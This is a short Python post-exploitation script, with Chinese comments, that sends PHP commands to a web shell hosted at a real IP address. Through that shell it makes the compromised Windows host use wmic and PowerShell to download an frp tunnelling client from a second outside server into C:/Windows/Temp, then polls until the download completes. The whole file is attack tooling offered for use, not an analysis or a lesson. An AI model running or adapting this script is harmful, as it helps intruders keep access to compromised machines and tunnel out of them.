#!/usr/bin/env python3
"""wmic 异步下载 frpc.exe (技能: start /b 会挂起, wmic 才异步)"""
import urllib.request, urllib.parse, time

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=30):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# wmic 异步启动 powershell 下载
dl = "system('wmic process call create \"powershell -NoProfile -Command Invoke-WebRequest -Uri http://165.99.43.145:9124/frp_serve.exe -OutFile C:/Windows/Temp/frpc.exe\"');print_r('WMIC_DONE');"
print("1. wmic 异步启动...", flush=True)
r = cmd(dl, 25)
print("   ", r.strip()[-80:], flush=True)

# 轮询
for i in range(12):
    time.sleep(5)
    r = cmd("print_r(filesize('C:/Windows/Temp/frpc.exe'));", 20)
    sz = r.strip().split()[-1] if r.strip() else "?"
    print(f"   第{i+1}次: {sz}", flush=True)
    try:
        if int(sz) > 10000000:
            print("   完成!", flush=True)
            break
    except:
        pass
